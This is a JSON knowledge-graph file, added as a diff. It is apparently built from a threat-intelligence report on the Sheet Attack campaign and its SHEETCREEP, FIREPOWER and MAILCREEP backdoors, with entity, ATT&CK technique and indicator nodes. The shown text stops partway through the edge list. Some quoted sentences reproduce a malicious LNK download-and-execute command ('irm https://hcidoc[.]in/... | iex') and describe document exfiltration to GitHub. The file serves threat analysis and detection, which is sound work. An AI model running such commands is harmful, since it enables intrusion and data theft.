@@ -1,0 +1,1057 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_001424583ef1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "India",
+        "edges": [],
+        "sentence_indices": [
+          8,
+          44
+        ],
+        "span_sentences": [
+          "Similar to the Gopher Strike campaign, the server employed geographic and User-Agent\nchecks to ensure the ZIP archive was only delivered to Windows systems in India, returning a “403 Forbidden” error otherwise.",
+          "Victimology: The campaigns predominantly target Indian government entities, which is consistent with APT36’s historical victimology."
+        ]
+      },
+      {
+        "node_id": "HL_0251d5a9c595",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "GitHub",
+        "edges": [
+          "EDGE_1"
+        ],
+        "sentence_indices": [
+          34,
+          48,
+          54
+        ],
+        "span_sentences": [
+          "The threat actor proceeded to upload those files to a threat actor-controlled private GitHub repository.",
+          "Infrastructure: The Google Sheets C2 and the threat actor's private GitHub commit logs both indicate the Asia/Karachi time zone, suggesting a Pakistan-based operator.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_0dc3a5008fdc",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MAILCREEP",
+        "edges": [
+          "EDGE_2",
+          "EDGE_3"
+        ],
+        "sentence_indices": [
+          0,
+          2,
+          35,
+          36,
+          38
+        ],
+        "span_sentences": [
+          "In September 2025, Zscaler ThreatLabz uncovered three additional backdoors, SHEETCREEP, FIREPOWER, and MAILCREEP, used to power the Sheet Attack campaign.",
+          "Between November 2025 and January 2026, ThreatLabz observed the deployment of new tools, including SHEETCREEP and FIREPOWER, along with MAILCREEP, which is used to manipulate emails, and a PowerShell-based document stealer to exfiltrate files.",
+          "To check for internet connectivity, MAILCREEP establishes a TCP connection to Google's public DNS server (8.8.8.8) on port 53.",
+          "If successful, MAILCREEP proceeds to its main loop.",
+          "For each victim, MAILCREEP creates a folder in the mailbox using the victim's identifier (formatted as\n[username]-[random number]\n)."
+        ]
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_4",
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7"
+        ],
+        "sentence_indices": [
+          2,
+          11,
+          23,
+          33,
+          47
+        ],
+        "span_sentences": [
+          "Between November 2025 and January 2026, ThreatLabz observed the deployment of new tools, including SHEETCREEP and FIREPOWER, along with MAILCREEP, which is used to manipulate emails, and a PowerShell-based document stealer to exfiltrate files.",
+          "These LNK files execute commands such as: --headless powershell -e [base64 powershell command]\nto execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex\n).",
+          "FIREPOWER is a backdoor written in PowerShell.",
+          "The threat actor deployed a PowerShell-based document stealer to selected targets, scanning the target’s Desktop, Documents and OneDrive directories for files with specific extensions (.txt, .csv, .pdf, .docx, .xlsx, .pptx).",
+          "This includes the use of Golang-based malware, consistent with APT36 examples such as DeskRAT and GoStealer, as well as the use of PowerShell scripts, which align with APT36’s observed development practices."
+        ]
+      },
+      {
+        "node_id": "HL_20b3ed555ace",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "Indian government entities",
+        "edges": [],
+        "sentence_indices": [
+          44,
+          54
+        ],
+        "span_sentences": [
+          "Victimology: The campaigns predominantly target Indian government entities, which is consistent with APT36’s historical victimology.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_37d5f6714279",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Pakistan",
+        "edges": [],
+        "sentence_indices": [
+          43,
+          48
+        ],
+        "span_sentences": [
+          "ThreatLabz assesses with medium confidence that the Gopher Strike and Sheet Attack campaigns were carried out by either a new Pakistan-linked APT group or a new sub-group of APT36, based on the following factors.",
+          "Infrastructure: The Google Sheets C2 and the threat actor's private GitHub commit logs both indicate the Asia/Karachi time zone, suggesting a Pakistan-based operator."
+        ]
+      },
+      {
+        "node_id": "HL_3d1a1935522e",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "SHEETCREEP",
+        "edges": [
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_10",
+          "EDGE_11",
+          "EDGE_12",
+          "EDGE_13"
+        ],
+        "sentence_indices": [
+          0,
+          2,
+          9,
+          12,
+          13,
+          17,
+          18,
+          20,
+          39
+        ],
+        "span_sentences": [
+          "In September 2025, Zscaler ThreatLabz uncovered three additional backdoors, SHEETCREEP, FIREPOWER, and MAILCREEP, used to power the Sheet Attack campaign.",
+          "Between November 2025 and January 2026, ThreatLabz observed the deployment of new tools, including SHEETCREEP and FIREPOWER, along with MAILCREEP, which is used to manipulate emails, and a PowerShell-based document stealer to exfiltrate files.",
+          "These ZIP archives contained the SHEETCREEP backdoor.",
+          "The GServices.vbs\nloader uses Powershell and reflection to load the backdoor, SHEETCREEP, which is a small C#-based backdoor with limited built-in functionality.",
+          "Upon execution, SHEETCREEP performs the following actions:\n- Decrypts and loads an embedded configuration using TripleDES (ECB).",
+          "If this fails, the SHEETCREEP backdoor retries, using backup configurations from a Firebase URL and a Google Cloud Storage URL.",
+          "After successfully creating a spreadsheet, the SHEETCREEP backdoor retrieves the contents of cells A1 through A300 and finds the next available empty row.",
+          "- SHEETCREEP then polls the spreadsheet every three seconds for new commands, which will be encrypted using the same TripleDES key.",
+          "Subsequently, it polls the mailbox for emails with subjects starting with “Input.”\nDuring the decompilation of the SHEETCREEP backdoor, ThreatLabz identified the use of emojis within its error-handling code."
+        ]
+      },
+      {
+        "node_id": "HL_44b3459204b4",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Azure",
+        "edges": [
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          37
+        ],
+        "span_sentences": [
+          "It leverages Microsoft's Graph API to manipulate emails and folders for C2 activity within a threat actor-controlled Azure tenant."
+        ]
+      },
+      {
+        "node_id": "HL_49884b2b2c2e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Microsoft",
+        "edges": [],
+        "sentence_indices": [
+          37,
+          54
+        ],
+        "span_sentences": [
+          "It leverages Microsoft's Graph API to manipulate emails and folders for C2 activity within a threat actor-controlled Azure tenant.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_59a1137676ac",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "Gopher Strike campaign",
+        "edges": [],
+        "sentence_indices": [
+          4,
+          8,
+          54
+        ],
+        "span_sentences": [
+          "Similar to the Gopher Strike campaign, some of the initial Sheet Attack campaigns began with the delivery of a PDF file.",
+          "Similar to the Gopher Strike campaign, the server employed geographic and User-Agent\nchecks to ensure the ZIP archive was only delivered to Windows systems in India, returning a “403 Forbidden” error otherwise.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_5a41715fe692",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Google",
+        "edges": [],
+        "sentence_indices": [
+          1,
+          14,
+          16,
+          17,
+          35,
+          40,
+          41,
+          48,
+          54
+        ],
+        "span_sentences": [
+          "The Sheet Attack campaign stands out for its use of Google Sheets as a command-and-control (C2) channel, an uncommon tactic in this region.",
+          "The configuration is a JSON dictionary consisting of Google Cloud credentials and a Google Sheet ID.",
+          "Interestingly, the code that generates the victim ID contains functionality to retrieve the victim’s MAC address, but the MAC address retrieved is never used.== - The victim ID is used to create a spreadsheet within the Google Sheets workbook.",
+          "If this fails, the SHEETCREEP backdoor retries, using backup configurations from a Firebase URL and a Google Cloud Storage URL.",
+          "To check for internet connectivity, MAILCREEP establishes a TCP connection to Google's public DNS server (8.8.8.8) on port 53.",
+          "This unusual coding style strongly suggests that generative AI tools were utilized during the malware's development, which is a worldwide trend as documented by Google and OpenAI.",
+          "While monitoring these Google Sheet C2 channels, ThreatLabz observed repeated commands, often accompanied by typos.",
+          "Infrastructure: The Google Sheets C2 and the threat actor's private GitHub commit logs both indicate the Asia/Karachi time zone, suggesting a Pakistan-based operator.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_64149f30cbc1",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "CurlBack RAT",
+        "edges": [],
+        "sentence_indices": [
+          52
+        ],
+        "span_sentences": [
+          "During the same timeframe, APT36 was observed targeting Linux and Windows systems using malicious .desktop files, HTA files, and CurlBack RAT."
+        ]
+      },
+      {
+        "node_id": "HL_688fb538c905",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft's Graph API",
+        "edges": [
+          "EDGE_15"
+        ],
+        "sentence_indices": [
+          37
+        ],
+        "span_sentences": [
+          "It leverages Microsoft's Graph API to manipulate emails and folders for C2 activity within a threat actor-controlled Azure tenant."
+        ]
+      },
+      {
+        "node_id": "HL_6e35b5673f23",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "OpenAI",
+        "edges": [],
+        "sentence_indices": [
+          40
+        ],
+        "span_sentences": [
+          "This unusual coding style strongly suggests that generative AI tools were utilized during the malware's development, which is a worldwide trend as documented by Google and OpenAI."
+        ]
+      },
+      {
+        "node_id": "HL_7ae3e4278757",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Cloud",
+        "edges": [],
+        "sentence_indices": [
+          14,
+          17
+        ],
+        "span_sentences": [
+          "The configuration is a JSON dictionary consisting of Google Cloud credentials and a Google Sheet ID.",
+          "If this fails, the SHEETCREEP backdoor retries, using backup configurations from a Firebase URL and a Google Cloud Storage URL."
+        ]
+      },
+      {
+        "node_id": "HL_7d7efcab8e2c",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "GServices.vbs",
+        "edges": [],
+        "sentence_indices": [
+          12
+        ],
+        "span_sentences": [
+          "The GServices.vbs\nloader uses Powershell and reflection to load the backdoor, SHEETCREEP, which is a small C#-based backdoor with limited built-in functionality."
+        ]
+      },
+      {
+        "node_id": "HL_80a0b844d4da",
+        "node_class": "high_level",
+        "node_type": "Campaign",
+        "node_text": "Sheet Attack campaign",
+        "edges": [
+          "EDGE_16",
+          "EDGE_17",
+          "EDGE_18",
+          "EDGE_19",
+          "EDGE_20",
+          "EDGE_21"
+        ],
+        "sentence_indices": [
+          0,
+          1,
+          4,
+          6,
+          10,
+          24,
+          30,
+          54
+        ],
+        "span_sentences": [
+          "In September 2025, Zscaler ThreatLabz uncovered three additional backdoors, SHEETCREEP, FIREPOWER, and MAILCREEP, used to power the Sheet Attack campaign.",
+          "The Sheet Attack campaign stands out for its use of Google Sheets as a command-and-control (C2) channel, an uncommon tactic in this region.",
+          "Similar to the Gopher Strike campaign, some of the initial Sheet Attack campaigns began with the delivery of a PDF file.",
+          "Figure 1: Example of a PDF file used in the Sheet Attack campaign.",
+          "More recent Sheet Attack campaigns have transitioned to using malicious LNK files to distribute another backdoor named FIREPOWER.",
+          "ThreatLabz observed that several variants of the FIREPOWER backdoor were delivered in the Sheet Attack campaign.",
+          "During the Sheet Attack campaign, ThreatLabz observed the threat actor deploying additional payloads to selected targets via FIREPOWER.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_87713f94840d",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "APT36",
+        "edges": [],
+        "sentence_indices": [
+          43,
+          44,
+          45,
+          46,
+          47,
+          49,
+          51,
+          52,
+          55
+        ],
+        "span_sentences": [
+          "ThreatLabz assesses with medium confidence that the Gopher Strike and Sheet Attack campaigns were carried out by either a new Pakistan-linked APT group or a new sub-group of APT36, based on the following factors.",
+          "Victimology: The campaigns predominantly target Indian government entities, which is consistent with APT36’s historical victimology.",
+          "APT36 has a well-documented history of heavily targeting Indian government institutions.",
+          "Tooling: There is a partial toolset overlap in these campaigns with APT36’s known tactics.",
+          "This includes the use of Golang-based malware, consistent with APT36 examples such as DeskRAT and GoStealer, as well as the use of PowerShell scripts, which align with APT36’s observed development practices.",
+          "Techniques: The Gopher Strike and Sheet Attack campaigns use evasion techniques that have not been previously associated with APT36.",
+          "Tooling: There are differences in tooling that set these campaigns apart from APT36’s typical operations.",
+          "During the same timeframe, APT36 was observed targeting Linux and Windows systems using malicious .desktop files, HTA files, and CurlBack RAT.",
+          "While both campaigns share TTPs with APT36, their concurrent operation alongside traditional APT36 activity, use of new tools, and potential generative AI in malware development suggest an evolution of APT36 or the emergence of a closely aligned group."
+        ]
+      },
+      {
+        "node_id": "HL_90efe23aaf5d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Sheets",
+        "edges": [
+          "EDGE_22",
+          "EDGE_23"
+        ],
+        "sentence_indices": [
+          1,
+          16,
+          48,
+          54
+        ],
+        "span_sentences": [
+          "The Sheet Attack campaign stands out for its use of Google Sheets as a command-and-control (C2) channel, an uncommon tactic in this region.",
+          "Interestingly, the code that generates the victim ID contains functionality to retrieve the victim’s MAC address, but the MAC address retrieved is never used.== - The victim ID is used to create a spreadsheet within the Google Sheets workbook.",
+          "Infrastructure: The Google Sheets C2 and the threat actor's private GitHub commit logs both indicate the Asia/Karachi time zone, suggesting a Pakistan-based operator.",
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_9b4374c69d53",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Firebase",
+        "edges": [
+          "EDGE_24",
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          54
+        ],
+        "span_sentences": [
+          "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+        ]
+      },
+      {
+        "node_id": "HL_9d194c347485",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "DeskRAT",
+        "edges": [],
+        "sentence_indices": [
+          47
+        ],
+        "span_sentences": [
+          "This includes the use of Golang-based malware, consistent with APT36 examples such as DeskRAT and GoStealer, as well as the use of PowerShell scripts, which align with APT36’s observed development practices."
+        ]
+      },
+      {
+        "node_id": "HL_cb9d03e625e4",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "FIREPOWER",
+        "edges": [
+          "EDGE_26",
+          "EDGE_27",
+          "EDGE_28"
+        ],
+        "sentence_indices": [
+          0,
+          2,
+          10,
+          23,
+          24,
+          26,
+          28,
+          30
+        ],
+        "span_sentences": [
+          "In September 2025, Zscaler ThreatLabz uncovered three additional backdoors, SHEETCREEP, FIREPOWER, and MAILCREEP, used to power the Sheet Attack campaign.",
+          "Between November 2025 and January 2026, ThreatLabz observed the deployment of new tools, including SHEETCREEP and FIREPOWER, along with MAILCREEP, which is used to manipulate emails, and a PowerShell-based document stealer to exfiltrate files.",
+          "More recent Sheet Attack campaigns have transitioned to using malicious LNK files to distribute another backdoor named FIREPOWER.",
+          "FIREPOWER is a backdoor written in PowerShell.",
+          "ThreatLabz observed that several variants of the FIREPOWER backdoor were delivered in the Sheet Attack campaign.",
+          "FIREPOWER operates within a C2 loop with a polling interval of 300 seconds, enabling it to execute a variety of tasks.",
+          "In addition, FIREPOWER checks the comStatus\nflags and, if required, will call Invoke-Expression\nto execute a command stored in db.baseDirectory.[victim id].command.",
+          "During the Sheet Attack campaign, ThreatLabz observed the threat actor deploying additional payloads to selected targets via FIREPOWER."
+        ]
+      },
+      {
+        "node_id": "HL_cd672110fb8d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Cloud Storage",
+        "edges": [
+          "EDGE_29",
+          "EDGE_30"
+        ],
+        "sentence_indices": [
+          17
+        ],
+        "span_sentences": [
+          "If this fails, the SHEETCREEP backdoor retries, using backup configurations from a Firebase URL and a Google Cloud Storage URL."
+        ]
+      },
+      {
+        "node_id": "HL_da51c8ce276f",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "GoStealer",
+        "edges": [],
+        "sentence_indices": [
+          47
+        ],
+        "span_sentences": [
+          "This includes the use of Golang-based malware, consistent with APT36 examples such as DeskRAT and GoStealer, as well as the use of PowerShell scripts, which align with APT36’s observed development practices."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [
+          "EDGE_8"
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            13
+          ],
+          [
+            20,
+            20
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Upon execution, SHEETCREEP performs the following actions:\n- Decrypts and loads an embedded configuration using TripleDES (ECB)."
+          ],
+          [
+            "- SHEETCREEP then polls the spreadsheet every three seconds for new commands, which will be encrypted using the same TripleDES key."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_4",
+          "EDGE_9",
+          "EDGE_16",
+          "EDGE_26",
+          "EDGE_31"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            9,
+            12
+          ],
+          [
+            11,
+            11
+          ],
+          [
+            19,
+            21
+          ],
+          [
+            28,
+            29
+          ],
+          [
+            33,
+            34
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Between November 2025 and January 2026, ThreatLabz observed the deployment of new tools, including SHEETCREEP and FIREPOWER, along with MAILCREEP, which is used to manipulate emails, and a PowerShell-based document stealer to exfiltrate files."
+          ],
+          [
+            "These ZIP archives contained the SHEETCREEP backdoor.",
+            "More recent Sheet Attack campaigns have transitioned to using malicious LNK files to distribute another backdoor named FIREPOWER.",
+            "These LNK files execute commands such as: --headless powershell -e [base64 powershell command]\nto execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex\n).",
+            "The GServices.vbs\nloader uses Powershell and reflection to load the backdoor, SHEETCREEP, which is a small C#-based backdoor with limited built-in functionality."
+          ],
+          [
+            "These LNK files execute commands such as: --headless powershell -e [base64 powershell command]\nto execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex\n)."
+          ],
+          [
+            "- A hidden\ncmd.exe\nprocess is also created in the background, with its standard input, output, and error streams redirected to the SHEETCREEP backdoor.",
+            "- SHEETCREEP then polls the spreadsheet every three seconds for new commands, which will be encrypted using the same TripleDES key.",
+            "These commands are executed using the hidden\ncmd.exe\nprocess in step 4 above."
+          ],
+          [
+            "In addition, FIREPOWER checks the comStatus\nflags and, if required, will call Invoke-Expression\nto execute a command stored in db.baseDirectory.[victim id].command.",
+            "The results of that command are appended to C:\\Users\\Public\\Documents\\text.log."
+          ],
+          [
+            "The threat actor deployed a PowerShell-based document stealer to selected targets, scanning the target’s Desktop, Documents and OneDrive directories for files with specific extensions (.txt, .csv, .pdf, .docx, .xlsx, .pptx).",
+            "The threat actor proceeded to upload those files to a threat actor-controlled private GitHub repository."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_2",
+          "EDGE_10",
+          "EDGE_17",
+          "EDGE_22",
+          "EDGE_24"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            16,
+            17
+          ],
+          [
+            20,
+            20
+          ],
+          [
+            36,
+            37
+          ],
+          [
+            41,
+            41
+          ],
+          [
+            54,
+            54
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The Sheet Attack campaign stands out for its use of Google Sheets as a command-and-control (C2) channel, an uncommon tactic in this region."
+          ],
+          [
+            "Interestingly, the code that generates the victim ID contains functionality to retrieve the victim’s MAC address, but the MAC address retrieved is never used.== - The victim ID is used to create a spreadsheet within the Google Sheets workbook.",
+            "If this fails, the SHEETCREEP backdoor retries, using backup configurations from a Firebase URL and a Google Cloud Storage URL."
+          ],
+          [
+            "- SHEETCREEP then polls the spreadsheet every three seconds for new commands, which will be encrypted using the same TripleDES key."
+          ],
+          [
+            "If successful, MAILCREEP proceeds to its main loop.",
+            "It leverages Microsoft's Graph API to manipulate emails and folders for C2 activity within a threat actor-controlled Azure tenant."
+          ],
+          [
+            "While monitoring these Google Sheet C2 channels, ThreatLabz observed repeated commands, often accompanied by typos."
+          ],
+          [
+            "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1102",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1102",
+        "edges": [
+          "EDGE_11",
+          "EDGE_14",
+          "EDGE_15",
+          "EDGE_18",
+          "EDGE_23",
+          "EDGE_25",
+          "EDGE_29"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            41,
+            41
+          ],
+          [
+            54,
+            54
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The Sheet Attack campaign stands out for its use of Google Sheets as a command-and-control (C2) channel, an uncommon tactic in this region."
+          ],
+          [
+            "While monitoring these Google Sheet C2 channels, ThreatLabz observed repeated commands, often accompanied by typos."
+          ],
+          [
+            "The Sheet Attack campaign targets Indian government entities by abusing legitimate internet services like GitHub accounts, Google Firebase, Google Sheets, and Microsoft’s Graph API to blend in with legitimate traffic, similar to the Gopher Strike campaign detailed in Part 1."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_5",
+          "EDGE_12",
+          "EDGE_19",
+          "EDGE_27",
+          "EDGE_30",
+          "EDGE_32"
+        ],
+        "best_span_ranges": [
+          [
+            11,
+            11
+          ],
+          [
+            26,
+            27
+          ],
+          [
+            30,
+            30
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "These LNK files execute commands such as: --headless powershell -e [base64 powershell command]\nto execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex\n)."
+          ],
+          [
+            "FIREPOWER operates within a C2 loop with a polling interval of 300 seconds, enabling it to execute a variety of tasks.",
+            "It then checks status flags and, if required, downloads a file from db.baseDirectory.[victim id].url\nusing the hardcoded User-Agent\n: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n."
+          ],
+          [
+            "During the Sheet Attack campaign, ThreatLabz observed the threat actor deploying additional payloads to selected targets via FIREPOWER."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1114",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1114",
+        "edges": [
+          "EDGE_3"
+        ],
+        "best_span_ranges": [
+          [
+            38,
+            38
+          ],
+          [
+            38,
+            39
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "For each victim, MAILCREEP creates a folder in the mailbox using the victim's identifier (formatted as\n[username]-[random number]\n)."
+          ],
+          [
+            "For each victim, MAILCREEP creates a folder in the mailbox using the victim's identifier (formatted as\n[username]-[random number]\n).",
+            "Subsequently, it polls the mailbox for emails with subjects starting with “Input.”\nDuring the decompilation of the SHEETCREEP backdoor, ThreatLabz identified the use of emojis within its error-handling code."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1119",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1119",
+        "edges": [
+          "EDGE_6"
+        ],
+        "best_span_ranges": [
+          [
+            33,
+            34
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The threat actor deployed a PowerShell-based document stealer to selected targets, scanning the target’s Desktop, Documents and OneDrive directories for files with specific extensions (.txt, .csv, .pdf, .docx, .xlsx, .pptx).",
+            "The threat actor proceeded to upload those files to a threat actor-controlled private GitHub repository."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1140",
+        "edges": [
+          "EDGE_13"
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            13
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Upon execution, SHEETCREEP performs the following actions:\n- Decrypts and loads an embedded configuration using TripleDES (ECB)."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1189",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1189",
+        "edges": [
+          "EDGE_20"
+        ],
+        "best_span_ranges": [
+          [
+            7,
+            7
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "After clicking the button, the user was directed to a threat actor-controlled website that served a ZIP archive."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1204",
+        "edges": [
+          "EDGE_21",
+          "EDGE_28"
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            5
+          ],
+          [
+            10,
+            10
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Similar to the Gopher Strike campaign, some of the initial Sheet Attack campaigns began with the delivery of a PDF file.",
+            "The PDF displayed a redacted document that tricked the recipient into clicking a Download Document button to access the full content, as shown in the figure below."
+          ],
+          [
+            "More recent Sheet Attack campaigns have transitioned to using malicious LNK files to distribute another backdoor named FIREPOWER."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1567",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1567",
+        "edges": [
+          "EDGE_1",
+          "EDGE_7"
+        ],
+        "best_span_ranges": [
+          [
+            33,
+            34
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The threat actor deployed a PowerShell-based document stealer to selected targets, scanning the target’s Desktop, Documents and OneDrive directories for files with specific extensions (.txt, .csv, .pdf, .docx, .xlsx, .pptx).",
+            "The threat actor proceeded to upload those files to a threat actor-controlled private GitHub repository."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_6c7f03ec22e4",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "8.8.8.8",
+        "edges": [],
+        "sentence_indices": [
+          35
+        ],
+        "span_sentences": [
+          "To check for internet connectivity, MAILCREEP establishes a TCP connection to Google's public DNS server (8.8.8.8) on port 53."
+        ]
+      },
+      {
+        "node_id": "IOC_8996a777ce0e",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://hcidoc[.]in/[path]",
+        "edges": [
+          "EDGE_31",
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          11
+        ],
+        "span_sentences": [
+          "These LNK files execute commands such as: --headless powershell -e [base64 powershell command]\nto execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex\n)."
+        ]
+      },
+      {
+        "node_id": "IOC_9307198ee733",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\Public\\Documents\\text.log",
+        "edges": [],
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "The results of that command are appended to C:\\Users\\Public\\Documents\\text.log."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_0251d5a9c595",
+      "node_v": "TTP_T1567"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_0dc3a5008fdc",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_0dc3a5008fdc",
+      "node_v": "TTP_T1114"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1119"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1567"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_11",
